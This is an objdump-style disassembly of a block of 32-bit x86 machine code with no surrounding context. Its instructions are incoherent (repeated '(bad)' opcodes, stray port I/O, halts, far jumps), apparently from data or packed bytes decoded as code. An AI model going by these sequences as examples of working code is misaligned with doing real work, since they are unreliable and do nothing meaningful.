  41711a:	mov    esi,0xe92c7165
  41711f:	jmp    0x2a874a0e
  417124:	dec    eax
  417125:	call   0xc8b2:0x90b983a9
  41712c:	scas   al,BYTE PTR es:[edi]
  41712d:	cli    
  41712e:	xlat   BYTE PTR ds:[ebx]
  41712f:	mov    WORD PTR [ebp-0x71],fs
  417132:	jae    0x4171ae
  417134:	mov    al,0x2
  417136:	inc    eax
  417137:	dec    cl
  417139:	int3   
  41713a:	je     0x41717e
  41713c:	sbb    DWORD PTR ds:0x577d31e0,edx
  417142:	or     ebp,ebp
  417144:	scas   eax,DWORD PTR es:[edi]
  417145:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417146:	sahf   
  417147:	xor    BYTE PTR [esi-0xa],cl
  41714a:	push   ds
  41714b:	das    
  41714c:	jno    0x417105
  41714e:	add    DWORD PTR [ebp+0x971b3f5],0xffffffbb
  417155:	push   cs
  417156:	sub    eax,0xb80bd0ac
  41715b:	adc    al,0x28
  41715d:	xchg   esi,eax
  41715e:	inc    esi
  41715f:	js     0x4171ac
  417161:	pop    ds
  417162:	retf   
  417163:	pusha  
  417164:	mov    ch,0xb2
  417166:	sar    eax,cl
  417168:	loopne 0x4171d5
  41716a:	sub    DWORD PTR [esi+ebx*2-0x5d],ecx
  41716e:	fwait
  41716f:	xchg   BYTE PTR [ebx+0x5b983b39],cl
  417175:	hlt    
  417176:	xor    BYTE PTR [ebp+0x3eef895f],dh
  41717c:	test   al,0xad
  41717e:	daa    
  41717f:	dec    edi
  417180:	mov    DWORD PTR [ebx+0x77],ebp
  417183:	mov    ebx,0xf8ffcb92
  417188:	fnstenv [ebp-0x306f838c]
  41718e:	push   ds
  41718f:	cs repz aad 0xaa
  417193:	dec    esi
  417194:	out    0x73,eax
  417196:	mov    ah,0xb9
  417198:	xchg   esp,eax
  417199:	push   es
  41719a:	xor    ecx,DWORD PTR [eax+0x2d4e4dc6]
  4171a0:	mov    edx,0xbe142e85
  4171a5:	out    0xc9,eax
  4171a7:	mov    ds:0x72470a29,eax
  4171ac:	mov    esp,0xc69c405b
  4171b1:	outs   dx,BYTE PTR ds:[esi]
  4171b2:	repnz test DWORD PTR [edx+0x4da6d810],ebp
  4171b9:	mov    eax,ds:0x4fcdb0fa
  4171be:	pop    ds
  4171bf:	ret    0x8b
  4171c2:	mov    ebx,0x88cef92e
  4171c7:	inc    esp
  4171c8:	push   ecx
  4171c9:	fwait
  4171ca:	xor    ch,BYTE PTR [ebp+0x6]
  4171cd:	inc    ebp
  4171ce:	es int 0x73
  4171d1:	outs   dx,BYTE PTR ds:[esi]
  4171d2:	mov    ebx,0x57f12fd7
  4171d7:	mov    esi,0x7e77d094
  4171dc:	sbb    esp,DWORD PTR [edi]
  4171de:	inc    eax
  4171df:	ret    
  4171e0:	ins    DWORD PTR es:[edi],dx
  4171e1:	fcmovbe st,st(0)
  4171e3:	mov    bl,0xd5
  4171e5:	std    
  4171e6:	dec    esp
  4171e7:	in     al,dx
  4171e8:	pop    ss
  4171e9:	xchg   edx,eax
  4171ea:	aam    0x9a
  4171ec:	stos   BYTE PTR es:[edi],al
  4171ed:	mov    bl,BYTE PTR [eax-0x107a9344]
  4171f3:	std    
  4171f4:	sub    al,0xed
  4171f6:	mov    ds:0x83dfef6,al
  4171fb:	push   cs
  4171fc:	dec    esi
  4171fd:	je     0x4171e6
  4171ff:	adc    BYTE PTR [ebx+0x301a3983],dh
  417205:	mov    dl,0xf9
  417207:	loopne 0x417234
  417209:	scas   al,BYTE PTR es:[edi]
  41720a:	pushf  
  41720b:	movaps XMMWORD PTR ds:[ecx-0x35],xmm1
  417210:	jae    0x4171ef
  417212:	ret    0x6ea9
  417215:	cld    
  417216:	xor    esp,DWORD PTR [esi+ecx*1]
  417219:	push   edx
  41721a:	test   edx,eax
  41721c:	ret    0x2d43
  41721f:	xlat   BYTE PTR ds:[ebx]
  417220:	mov    eax,ds:0xcee286d
  417225:	cmp    eax,edx
  417227:	fld    DWORD PTR [ebp+0x1d8b5db9]
  41722d:	mov    bh,0x2c
  41722f:	pop    ebp
  417230:	add    edi,DWORD PTR [ebp-0x77]
  417233:	out    0x10,eax
  417235:	(bad)  
  417236:	(bad)  
  417237:	jge    0x41723e
  417239:	xchg   dh,dl
  41723b:	popa   
  41723c:	or     eax,0x8ac47a2c
  417241:	imul   ecx,DWORD PTR [esi+0x2f],0xb27a67ec
  417248:	pop    esi
  417249:	outs   dx,DWORD PTR ds:[esi]
  41724a:	push   ebp
  41724b:	int3   
  41724c:	test   BYTE PTR [eax+0x3db9ad16],ah
  417252:	push   esp
  417253:	xchg   ebx,eax
  417254:	daa    
  417255:	dec    ecx
  417256:	and    al,0xa1
  417258:	mov    al,ds:0x6d0e0c66
  41725d:	pop    edi
  41725e:	dec    edx
  41725f:	sub    al,0xbd
  417261:	and    DWORD PTR [ebx+0x19],ebx
  417264:	or     BYTE PTR [edx],dl
  417266:	arpl   sp,si
  417268:	(bad)  
  417269:	frstor [ecx]
  41726b:	outs   dx,BYTE PTR ds:[esi]
  41726c:	stc    
  41726d:	sbb    BYTE PTR [ebp-0x2f9fa3d9],ah
  417273:	push   eax
  417274:	xor    eax,0x3bcf87f8
  417279:	inc    edi
  41727a:	scas   al,BYTE PTR es:[edi]
  41727b:	lock xor al,0x29
  41727e:	xchg   esp,eax
  41727f:	mov    ah,0xf9
  417281:	or     eax,0xa0b095e2
  417286:	xor    al,0xe0
  417288:	push   esp
  417289:	pop    edx
  41728a:	mov    ss,WORD PTR [esp+ebx*2]
  41728d:	aam    0x1a
  41728f:	jp     0x417309
  417291:	(bad)  [esi]
  417293:	push   0xffffffcf
  417295:	sbb    dh,BYTE PTR [esi+edi*1+0x15ed60c5]
  41729c:	retf   
  41729d:	fldenv [ebx-0x3df0f508]
  4172a3:	ins    BYTE PTR es:[edi],dx
  4172a4:	rol    eax,1
  4172a6:	sbb    eax,0x923641b8
  4172ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172ac:	cwde   
  4172ad:	scas   eax,DWORD PTR es:[edi]
  4172ae:	cdq    
  4172af:	dec    edx
  4172b0:	aad    0xc3
  4172b2:	and    ebx,ecx
  4172b4:	lods   eax,DWORD PTR ds:[esi]
  4172b5:	mov    bl,BYTE PTR [edi-0x567123d7]
  4172bb:	cs jbe 0x417240
  4172be:	push   ebp
  4172bf:	das    
  4172c0:	sub    BYTE PTR [ecx-0x28],0x8a
  4172c4:	cwde   
  4172c5:	inc    edi
  4172c6:	pop    eax
  4172c7:	or     eax,DWORD PTR [ebx-0x7d0ac014]
  4172cd:	call   0x6b18:0xccdfb72d
  4172d4:	pop    esi
  4172d5:	add    dh,dl
  4172d7:	sbb    al,0x30
  4172d9:	jae    0x41726d
  4172db:	cmp    DWORD PTR [edi+0x909fb36],edx
  4172e1:	mov    esi,0x23e070e7
  4172e6:	xchg   BYTE PTR ds:0xcb9438e7,bh
  4172ec:	mov    esp,DWORD PTR [ebx+0x45a70305]
  4172f2:	push   cs
  4172f3:	xchg   DWORD PTR [esi-0x25734772],ebx
  4172f9:	sub    eax,0x5e257a57
  4172fe:	std    
  4172ff:	fisubr WORD PTR [edx+ebp*4-0x4c]
  417303:	ja     0x4172b6
  417305:	bound  edx,QWORD PTR [ebp+0x62fe527c]
  41730b:	in     al,0x26
  41730d:	ins    DWORD PTR es:[edi],dx
  41730e:	push   ds
  41730f:	fsincos 
  417311:	xor    al,0xe3
  417313:	div    BYTE PTR [ebx]
  417315:	mov    dl,BYTE PTR ds:0x9bb4e804
  41731b:	out    dx,eax
  41731c:	push   es
  41731d:	push   eax
  41731e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41731f:	xor    al,BYTE PTR [esi]
  417321:	jns    0x4172db
  417323:	and    cl,BYTE PTR [edx]
  417325:	ret    0xbe5c
  417328:	cmp    dl,BYTE PTR [edi]
  41732a:	jecxz  0x417307
  41732c:	and    eax,0x6b2e64e3
  417331:	retf   0xa37c
  417334:	stc    
  417335:	mov    ah,0x63
  417337:	mov    ah,0x2b
  417339:	sub    DWORD PTR [esi],ecx
  41733b:	in     al,0x30
  41733d:	mov    ebx,0xef8f02da
  417342:	lea    esp,[edi+ecx*8-0x237ed378]
  417349:	xor    al,0x2c
  41734b:	cld    
  41734c:	inc    eax
  41734d:	(bad)  
  41734e:	xchg   ecx,eax
  41734f:	loop   0x4172e8
  417351:	xchg   edx,eax
  417352:	in     eax,dx
  417353:	ds jge 0x4172d8
  417356:	enter  0xe473,0x6b
  41735a:	(bad)  
  41735b:	outs   dx,DWORD PTR ds:[esi]
  41735c:	loop   0x417380
  41735e:	mov    eax,0x8da84711
  417363:	lea    esp,[edi+0x8]
  417366:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417367:	(bad)  [edi+0x4b696eca]
  41736d:	outs   dx,DWORD PTR ds:[esi]
  41736e:	pop    edi
  41736f:	pop    ebx
  417370:	sbb    dl,BYTE PTR [esi]
  417372:	cmp    DWORD PTR [ebp-0x77],edx
  417375:	ss push es
  417377:	pop    esp
  417378:	xchg   ebp,eax
  417379:	addr16 jmp 0x83c12aba
  41737f:	adc    BYTE PTR [edx-0x72fe6725],dh
  417385:	outs   dx,BYTE PTR ds:[esi]
  417386:	xor    eax,0x5689d472
  41738b:	jno    0x417395
  41738d:	dec    ebx
  41738e:	mov    ebx,0x5396d30a
  417393:	cld    
  417394:	popa   
  417395:	(bad)  
  417398:	pop    ebx
  417399:	and    cl,bl
  41739b:	and    ebp,DWORD PTR [ebp-0x38]
  41739e:	inc    ebx
  41739f:	pop    esp
  4173a0:	xlat   BYTE PTR ds:[ebx]
  4173a1:	out    0xb5,eax
  4173a3:	loop   0x41741e
  4173a5:	dec    edi
  4173a6:	stos   DWORD PTR es:[edi],eax
  4173a7:	jle    0x41739b
  4173a9:	ror    BYTE PTR [edx+0x5f7fccec],0xa0
  4173b0:	ud0    ebp,DWORD PTR [edx+0x10f96470]
  4173b7:	xchg   ecx,eax
  4173b8:	mov    WORD PTR [esi+0x76b3b4fe],es
  4173be:	adc    DWORD PTR [eax+0x71cb6bfe],esp
  4173c4:	mov    ecx,0xc9aaa4b5
  4173c9:	jno    0x4173c2
  4173cb:	push   eax
  4173cc:	mov    al,BYTE PTR [edi+0x6]
  4173cf:	(bad)  
  4173d0:	mov    dh,0x3a
  4173d2:	retf   
  4173d3:	sar    ah,cl
  4173d5:	jmp    0x417366
  4173d7:	mov    ds:0xef9b324b,al
  4173dc:	jb     0x41744c
  4173de:	push   0x71
  4173e0:	cs jmp 0x2da166bc
  4173e6:	mov    ah,0x7
  4173e8:	and    eax,esi
  4173ea:	adc    al,0x5d
  4173ec:	ror    DWORD PTR ds:0x2c950ff6,1
  4173f2:	and    al,0xe0
  4173f4:	shl    ah,0x1b
  4173f7:	mov    WORD PTR [ebp*2+0x731dcace],cs
  4173fe:	popa   
  4173ff:	push   ds
  417400:	mov    esp,0x73b54bc5
  417405:	sbb    BYTE PTR [edx-0x34],bl
  417408:	xchg   esp,eax
  417409:	jmp    0x4173dc
  41740b:	sbb    eax,0x270f0589
  417410:	xor    eax,0xd679f620
  417415:	fdivr  DWORD PTR [ebp-0x67]
  417418:	loop   0x4173c4
  41741a:	mov    esi,0xe805e9f
  41741f:	stc    
  417420:	stc    
  417421:	and    ebp,edi
  417423:	popf   
  417424:	sub    DWORD PTR [ecx],edx
  417426:	test   esp,ecx
  417428:	lods   al,BYTE PTR ds:[esi]
  417429:	or     eax,0x7fdd2f08
  41742e:	sbb    ebp,DWORD PTR [ecx]
  417430:	mov    al,0x59
  417432:	cmp    eax,DWORD PTR [edx+0x7adb5b2f]
  417438:	sbb    esi,ecx
  41743a:	jl     0x4174a7
  41743c:	ret    0x1de1
  41743f:	xor    al,0x80
  417441:	js     0x4173f2
  417443:	retf   
  417444:	rcr    DWORD PTR [edi-0x55dafcc3],0x28
  41744b:	dec    esp
  41744c:	xchg   DWORD PTR [ebx],ebp
  41744e:	add    BYTE PTR ds:0x27608e88,bh
  417454:	sub    edi,eax
  417456:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417457:	dec    edi
  417458:	je     0x41747e
  41745a:	cmp    al,0x9e
  41745c:	js     0x417438
  41745e:	mov    cl,0x39
  417460:	push   esp
  417461:	loope  0x417414
  417463:	jl     0x4174dc
  417465:	cmp    BYTE PTR [edx-0x52],dl
  417468:	jae    0x41742e
  41746a:	push   esp
  41746b:	dec    ax
  41746d:	in     eax,0x42
  41746f:	(bad)
  417472:	sbb    al,0x25
  417474:	ror    esp,cl
  417476:	ret    
  417477:	pop    ecx
  417478:	retf   0x44e3
  41747b:	fcmovnu st,st(7)
  41747d:	fadd   QWORD PTR [ecx-0x5dbb9174]
  417483:	es int 0x12
  417486:	mov    ds:0x8d956fd6,eax
  41748b:	out    0xbc,al
  41748d:	mov    ah,0x62
  41748f:	sbb    al,0x87
  417491:	pusha  
  417492:	xchg   BYTE PTR [ecx],bl
  417494:	pop    edi
  417495:	pop    eax
  417496:	arpl   bx,si
  417498:	enter  0x8a9d,0xd4
  41749c:	not    dl
  41749e:	ss ins BYTE PTR es:[edi],dx
  4174a0:	push   ds
  4174a1:	xchg   ebp,eax
  4174a2:	enter  0xe0a1,0xa3
  4174a6:	enter  0x577b,0x8
  4174aa:	stc    
  4174ab:	pop    esp
  4174ac:	scas   al,BYTE PTR es:[edi]
  4174ad:	push   edi
  4174ae:	pop    ds
  4174af:	dec    ecx
  4174b0:	in     al,0xef
  4174b2:	fwait
  4174b3:	adc    ebx,edx
  4174b5:	mov    ecx,0xa0fef7a2
  4174ba:	and    DWORD PTR [ebx+eax*1],esp
  4174bd:	mov    esi,ss
  4174bf:	(bad)  
  4174c0:	jmp    0xdf55:0x95bd8dad
  4174c7:	push   edi
  4174c8:	in     al,0xae
  4174ca:	aam    0xb1
  4174cc:	or     edi,DWORD PTR [ecx]
  4174ce:	pop    ss
  4174cf:	nop
  4174d0:	hlt    
  4174d1:	out    dx,eax
  4174d2:	jne    0x4174b1
  4174d4:	rcr    DWORD PTR [esp+eax*4],cl
  4174d7:	in     eax,dx
  4174d8:	fs sub edi,esi
  4174db:	dec    edx
  4174dc:	adc    bh,bh
  4174de:	fist   WORD PTR [ebx]
  4174e0:	sbb    BYTE PTR [edi-0x55],bl
  4174e3:	icebp  
  4174e4:	fdiv   QWORD PTR [eax+0x47]
  4174e7:	pop    ebx
  4174e8:	imul   edx,DWORD PTR [ecx+0xe5ef7c0],0x2f
  4174ef:	hlt    
  4174f0:	bound  ecx,QWORD PTR [eiz*4+0x6bf24b8a]
  4174f7:	dec    esp
  4174f8:	ror    ah,1
  4174fa:	pop    ebp
  4174fb:	sub    eax,0xbb9212b5
  417500:	test   BYTE PTR [ebx-0x460b0aaa],dl
  417506:	mov    edi,0xf7261d5a
  41750b:	inc    ebp
  41750c:	xchg   eax,esp
  41750e:	cs jae 0x41755e
  417511:	inc    ecx
  417512:	repnz std 
  417514:	mov    esi,0x240667d6
  417519:	shl    cl,cl
  41751b:	inc    esi
  41751c:	cmp    bl,ch
  41751e:	out    0x71,eax
  417520:	dec    edx
  417521:	arpl   WORD PTR [edi],bx
  417523:	aad    0x1f
  417525:	fcomp  DWORD PTR [eax]
  417527:	jg     0x417578
  417529:	aas    
  41752a:	enter  0x9487,0xf0
  41752e:	ja     0x41756e
  417530:	stc    
  417531:	add    edx,edx
  417533:	ja     0x417501
  417535:	dec    edx
  417536:	mov    ds:0xa66789f4,eax
  41753b:	stc    
  41753c:	sub    eax,0x2920c541
  417541:	mov    esp,0xffaee7da
  417546:	pop    eax
  417547:	mov    al,0x88
  417549:	xchg   esp,eax
  41754a:	xchg   ebx,eax
  41754b:	sbb    al,0xca
  41754d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41754e:	bswap  ecx
  417550:	sbb    al,0xd
  417552:	into   
  417553:	push   eax
  417554:	sbb    dl,BYTE PTR [eax-0x2f]
  417557:	xchg   esi,eax
  417558:	mov    WORD PTR [edx-0x3f],es
  41755b:	leave  
  41755c:	mov    ecx,0x769b1cbb
  417561:	pop    edi
  417562:	aam    0xa1
  417564:	lea    ebp,[edi-0x1d]
  417567:	int    0xe5
  417569:	jno    0x41759d
  41756b:	pop    ebp
  41756c:	inc    eax
  41756d:	cmc    
  41756e:	sub    esp,esi
  417570:	fldenv [esi+0xc659af8]
  417576:	ficom  DWORD PTR [esi+0x5b]
  417579:	fild   DWORD PTR [esi+ebp*2-0x185c17e1]
  417580:	cmp    DWORD PTR [edx-0xa],0x45
  417584:	push   edx
  417585:	leave  
  417586:	mov    dh,0x87
  417588:	jg     0x417512
  41758a:	xor    BYTE PTR [edx+0x3bda29fd],bl
  417590:	(bad)  
  417591:	cmp    esp,DWORD PTR [eax-0x375c1fbe]
  417597:	mov    dl,0x37
  417599:	push   ds
  41759a:	xor    edi,eax
  41759c:	lock pushf 
  41759e:	and    DWORD PTR [ecx-0x24],esp
  4175a1:	and    BYTE PTR [eax-0x59],0x40
  4175a5:	cmp    eax,0xbe74338a
  4175aa:	pop    es
  4175ab:	jns    0x41753b
  4175ad:	inc    esi
  4175ae:	push   edx
  4175af:	xchg   ebp,edx
  4175b1:	cdq    
  4175b2:	popf   
  4175b3:	(bad)  
  4175b4:	jne    0x4175c5
  4175b6:	out    dx,al
  4175b7:	mov    ecx,0x6465485a
  4175bc:	daa    
  4175bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175be:	stos   BYTE PTR es:[edi],al
  4175bf:	imul   edi,DWORD PTR [edx-0x31],0xe48058ad
  4175c6:	addr16 mov eax,ds:0x8582
  4175ca:	aaa    
  4175cb:	jb     0x41764a
  4175cd:	sub    ecx,DWORD PTR [edi+0x4ac9944]
  4175d3:	jb     0x4175f2
  4175d5:	stos   BYTE PTR es:[edi],al
  4175d6:	lock je 0x417568
  4175d9:	sahf   
  4175da:	and    BYTE PTR [ebp-0x79dd5a2],cl
  4175e0:	pushf  
  4175e1:	add    BYTE PTR [eax-0x1a374b5d],bl
  4175e7:	or     al,0xa1
  4175e9:	add    DWORD PTR [eax+0x45ddab1d],0xffffffb9
  4175f0:	mov    ecx,0x2881a8b0
  4175f5:	repnz cwde 
  4175f7:	fcom   DWORD PTR [edx+esi*1]
  4175fa:	mov    ecx,0x79965e5d
  4175ff:	shl    DWORD PTR [esi+ebx*2+0x11],cl
  417603:	scas   al,BYTE PTR es:[edi]
  417604:	int    0xbe
  417606:	sbb    bl,ch
  417608:	test   DWORD PTR [ebx],0x2517ea01
  41760e:	arpl   cx,cx
  417610:	jp     0x417657
  417612:	pop    ds
  417613:	and    BYTE PTR [bx+di+0x24ca],0x35
  417619:	push   eax
  41761a:	push   esp
  41761b:	and    al,0xf5
  41761d:	xor    DWORD PTR [eax+edx*1],esi
  417620:	aas    
  417621:	adc    dh,BYTE PTR [ebx-0x45]
  417624:	in     eax,dx
  417625:	pop    ebp
  417626:	retf   0x97d0
  417629:	in     eax,dx
  41762a:	xchg   edx,eax
  41762b:	jae    0x4175f6
  41762d:	add    ebx,DWORD PTR [edx+0x3f2df661]
  417633:	sbb    al,0x3f
  417635:	stos   BYTE PTR es:[edi],al
  417636:	addr16 jle 0x417641
  417639:	aas    
  41763a:	jg     0x41765c
  41763c:	sbb    DWORD PTR [eax],ebx
  41763e:	jbe    0x4175e2
  417640:	sub    dh,dh
  417642:	sub    DWORD PTR [edx],esi
  417644:	cwde   
  417645:	arpl   WORD PTR [ebx],ax
  417647:	dec    eax
  417648:	lods   al,BYTE PTR ds:[esi]
  417649:	cmp    al,0xf7
  41764b:	xchg   esi,eax
  41764c:	xor    edx,esp
  41764e:	ds dec ebx
  417650:	rol    eax,0x3
  417653:	mov    al,ds:0x56faff0c
  417658:	inc    esi
  417659:	loopne 0x417640
  41765b:	mov    ebx,0x764eb9ba
  417660:	mov    edi,0x2d328654
  417665:	das    
  417666:	ds clc 
  417668:	aas    
  417669:	add    al,0xb8
  41766b:	iret   
  41766c:	in     al,dx
  41766d:	add    eax,0x201a187b
  417672:	and    al,BYTE PTR [eax+edx*1]
  417675:	mov    ecx,0xbba90b8b
  41767a:	retf   0xe814
  41767d:	jnp    0x417674
  41767f:	dec    eax
  417680:	arpl   WORD PTR [esi+0x1a],bx
  417683:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417684:	or     al,0xa3
  417686:	push   esi
  417687:	je     0x41763f
  417689:	xchg   BYTE PTR [ebp-0xa],bl
  41768c:	mov    DWORD PTR [eax+0x7e846302],edx
  417692:	mov    ch,BYTE PTR cs:[ebx-0x6]
  417696:	int    0xbd
  417698:	aam    0x98
  41769a:	add    ebp,ebp
  41769c:	push   edx
  41769d:	push   ebx
  41769e:	or     esp,DWORD PTR [ebp+0x505b63ec]
  4176a4:	cmp    BYTE PTR [ecx+ebp*8-0x48],bh
  4176a8:	jno    0x41765a
  4176aa:	aaa    
  4176ab:	dec    esi
  4176ac:	mov    dh,0x16
  4176ae:	xlat   BYTE PTR ds:[ebx]
  4176af:	cmp    ebx,DWORD PTR [ecx]
  4176b1:	cmp    al,0x27
  4176b3:	xor    ebx,DWORD PTR [ebp+0x728f4400]
  4176b9:	push   0x3592b652
  4176be:	dec    edi
  4176bf:	push   ds
  4176c0:	push   esi
  4176c1:	les    edx,FWORD PTR [ebx]
  4176c3:	dec    ebp
  4176c4:	dec    ebp
  4176c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176c6:	cli    
  4176c7:	or     bl,BYTE PTR [eax+0x17]
  4176ca:	dec    edi
  4176cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176cc:	cwde   
  4176cd:	dec    edi
  4176ce:	es rcr edi,1
  4176d1:	sar    DWORD PTR ss:[ecx],0x84
  4176d5:	mov    ds:0x3e46631d,eax
  4176da:	sti    
  4176db:	cmp    eax,0x58424992
  4176e0:	cmp    al,0x57
  4176e2:	mov    ah,BYTE PTR [edx+ebx*4]
  4176e5:	je     0x417756
  4176e7:	jno    0x4176e6
  4176e9:	push   ebp
  4176ea:	movnti DWORD PTR [esi-0x62],edx
  4176ee:	jne    0x417688
  4176f0:	fdiv   DWORD PTR [edi+eiz*8]
  4176f3:	jns    0x4176ca
  4176f5:	test   DWORD PTR [edi],edi
  4176f7:	inc    esp
  4176f8:	xor    eax,0x1eac362
  4176fd:	push   0x6f23e688
  417702:	mov    BYTE PTR [eax-0x1f916103],ch
  417708:	mov    ch,0x2a
  41770a:	inc    edi
  41770b:	jge    0x417738
  41770d:	imul   edi,esp,0xad131bf2
  417713:	xchg   ebx,eax
  417714:	and    ecx,DWORD PTR ds:0x491e271b
  41771a:	dec    edx
  41771b:	mov    esi,0xf26ad6cc
  417720:	add    ebp,ebp
  417722:	fucom  st(5)
  417724:	dec    esp
  417725:	or     BYTE PTR [ebp-0x68294b6a],bl
  41772b:	into   
  41772c:	and    eax,0x28cbe957
  417731:	fldcw  WORD PTR [ebx+0x1ecf96df]
  417737:	mov    ds:0xf335d188,eax
  41773c:	inc    ebp
  41773d:	stos   BYTE PTR es:[edi],al
  41773e:	mov    ds:0x35a8140f,al
  417743:	arpl   WORD PTR [ebx-0x42],cx
  417746:	mov    eax,0x6c4ffc02
  41774b:	fucom  st(6)
  41774d:	lock sub al,0x74
  417750:	adc    DWORD PTR [edi+eiz*4],eax
  417753:	arpl   WORD PTR [ebp+edx*2-0x44d05867],si
  41775a:	imul   ebp,DWORD PTR [esi-0xd],0x77489f15
  417761:	pop    eax
  417762:	xchg   esi,eax
  417763:	dec    ebx
  417764:	das    
  417765:	out    dx,eax
  417766:	lock pop esi
  417768:	test   al,0xeb
  41776a:	outs   dx,DWORD PTR ds:[esi]
  41776b:	adc    DWORD PTR [ecx-0x4c1c0778],esp
  417771:	rol    dl,cl
  417773:	mov    cl,0xef
  417775:	sub    eax,DWORD PTR [eax+0x3b]
  417778:	inc    esi
  417779:	jp     0x417777
  41777b:	jl     0x41771c
  41777d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41777e:	jo     0x4177c2
  417780:	jbe    0x417733
  417782:	sub    al,BYTE PTR [esi-0x1c]
  417785:	rcl    DWORD PTR ds:0x3dd80d01,1
  41778b:	xor    esp,DWORD PTR [ebx]
  41778d:	lods   al,BYTE PTR ds:[esi]
  41778e:	push   eax
  41778f:	and    BYTE PTR [eax+0x5],cl
  417792:	pop    edx
  417793:	cdq    
  417794:	scas   al,BYTE PTR es:[edi]
  417795:	aaa    
  417796:	mov    DWORD PTR [ecx],esp
  417798:	neg    BYTE PTR [ecx-0x5ca5ded5]
  41779e:	and    eax,0x188c883a
  4177a3:	loop   0x417818
  4177a5:	xor    eax,DWORD PTR [edi]
  4177a7:	sub    ebp,DWORD PTR [edi+0x65]
  4177aa:	xor    edx,DWORD PTR [eax]
  4177ac:	mov    esp,DWORD PTR [ebx-0x3f]
  4177af:	mov    cl,0xf0
  4177b1:	sbb    esi,DWORD PTR [ebp-0x7e]
  4177b4:	lods   eax,DWORD PTR ds:[esi]
  4177b5:	mov    bl,0x20
  4177b7:	retf   
  4177b8:	push   ds
  4177b9:	dec    edi
  4177ba:	push   0xffffffd4
  4177bc:	rcr    BYTE PTR [ecx+0x2e],cl
  4177bf:	push   edi
  4177c0:	sti    
  4177c1:	out    dx,al
  4177c2:	add    BYTE PTR ds:0xd3230176,al
  4177c8:	hlt    
  4177c9:	inc    eax
  4177ca:	mov    ebx,DWORD PTR [ebx+edi*8-0x7f]
  4177ce:	sub    dh,cl
  4177d0:	icebp  
  4177d1:	loopne 0x41778d
  4177d3:	lahf   
  4177d4:	jne    0x4177d3
  4177d6:	jecxz  0x417832
  4177d8:	add    DWORD PTR [edi+0x7fc4797a],0x4778a416
  4177e2:	or     edx,esp
  4177e4:	cdq    
  4177e5:	in     eax,0xc9
  4177e7:	dec    edi
  4177e8:	adc    al,0x92
  4177ea:	xor    edi,DWORD PTR [eax+0x6d72bd04]
  4177f0:	mov    eax,0xb14007a9
  4177f5:	scas   eax,DWORD PTR es:[edi]
  4177f6:	test   al,0x2a
  4177f8:	dec    ebp
  4177f9:	ds xchg ecx,eax
  4177fb:	fcmovnbe st,st(0)
  4177fd:	rcr    DWORD PTR [ebp-0x4],1
  417800:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417801:	sbb    DWORD PTR [eax+0x1e],ebp
  417804:	das    
  417805:	push   ebp
  417806:	repz jg 0x417817
  417809:	bound  edi,QWORD PTR fs:[bx+si-0x4abd]
  41780f:	fdiv   QWORD PTR [ebp+0x1faa5dc7]
  417815:	xchg   BYTE PTR [edi],ch
  417817:	lods   eax,DWORD PTR ds:[esi]
  417818:	mov    ss,WORD PTR [ecx+0x4021a3cc]
  41781e:	popf   
  41781f:	adc    DWORD PTR [esi+eiz*4-0x1b2c4e92],esp
  417826:	push   es
  417827:	sbb    eax,0xb6eeee6b
  41782c:	mov    ebx,0x54bc12f5
  417831:	clc    
  417832:	xchg   edi,eax
  417833:	sbb    DWORD PTR [ebp+esi*4-0x4c],esi
  417837:	cmp    esp,DWORD PTR [ebx-0x76]
  41783a:	sub    BYTE PTR [eax],0x64
  41783d:	push   edi
  41783e:	pop    esi
  41783f:	mov    ch,0x19
  417841:	mov    ds:0x1cf065c7,al
  417846:	das    
  417847:	in     eax,0xc2
  417849:	sar    BYTE PTR [ebp-0x4b],cl
  41784c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41784d:	push   eax
  41784e:	sti    
  41784f:	xchg   BYTE PTR [edi],bh
  417851:	dec    esi
  417852:	lds    edi,FWORD PTR [esi]
  417854:	ja     0x41786d
  417856:	fmulp  st(1),st
  417858:	iret   
  417859:	mov    dl,BYTE PTR [edi]
  41785b:	mov    ah,0x6e
  41785d:	in     al,0x9b
  41785f:	sbb    eax,0xaa0c101c
  417864:	imul   edi,edx,0xc294f0dc
  41786a:	call   0x6dd:0x46b35e58
  417871:	stos   BYTE PTR es:[edi],al
  417872:	dec    edi
  417873:	cld    
  417874:	cmp    ch,BYTE PTR [esi]
  417876:	ja     0x4178c6
  417878:	xchg   DWORD PTR [eax-0x2a310a50],esi
  41787e:	inc    ebx
  41787f:	test   eax,0xd6297fa8
  417884:	leave  
  417885:	sub    edi,DWORD PTR [eax-0x3f9199f0]
  41788b:	lods   eax,DWORD PTR ds:[esi]
  41788c:	repnz adc eax,0xbaa0818c
  417892:	(bad)
  417895:	or     eax,0xd1c43e31
  41789a:	shr    bl,1
  41789c:	mov    ecx,0x3ee8da0e
  4178a1:	push   es
  4178a2:	jle    0x41785b
  4178a4:	lods   eax,DWORD PTR ds:[esi]
  4178a5:	or     BYTE PTR [ebp+0x22],dh
  4178a8:	js     0x417859
  4178aa:	leave  
  4178ab:	test   BYTE PTR [edx],0x40
  4178ae:	inc    ebx
  4178af:	lods   al,BYTE PTR ds:[esi]
  4178b0:	sbb    al,0xbf
  4178b2:	inc    eax
  4178b3:	cmp    ch,dh
  4178b5:	call   0xa3725bdb
  4178ba:	iret   
  4178bb:	mov    DWORD PTR [edi+0x7c39e6ae],0x732d4d07
  4178c5:	call   0x8087:0x720dcbf1
  4178cc:	neg    DWORD PTR [eax+0x26]
  4178cf:	add    eax,0x91f75bde
  4178d4:	mov    fs,WORD PTR [eax+ecx*2-0x2f]
  4178d8:	pop    es
  4178d9:	jl     0x417860
  4178db:	cmp    eax,0x3d542d44
  4178e0:	test   ebp,edi
  4178e2:	icebp  
  4178e3:	std    
  4178e4:	outs   dx,BYTE PTR ds:[esi]
  4178e5:	dec    ebx
  4178e6:	sar    DWORD PTR [ebp-0x1d],0x12
  4178ea:	es dec ecx
